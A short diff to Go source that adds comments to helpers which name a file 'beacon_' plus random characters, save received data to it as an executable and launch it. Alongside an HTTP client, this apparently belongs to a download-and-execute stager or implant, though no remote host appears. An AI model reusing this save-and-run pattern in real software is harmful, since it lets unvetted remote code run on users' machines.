@@ -27,6 +27,7 @@ func httpClient() *http.Client {
 	}
 }
 
+// filename generates a random filename with the prefix beacon_.
 func filename() string {
 	b := make([]byte, 6)
 
@@ -36,6 +37,7 @@ func filename() string {
 	return "beacon_" + base64.StdEncoding.EncodeToString(b)
 }
 
+// Save the given data as a file.
 func save(data []byte) string {
 	name := filename()
 	f, err := os.OpenFile(name, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
@@ -49,6 +51,7 @@ func save(data []byte) string {
 	return name
 }
 
+// Execute a given filename.
 func run(filename string) {
 	cmd := exec.Command("./" + filename)
 	cmd.Start()
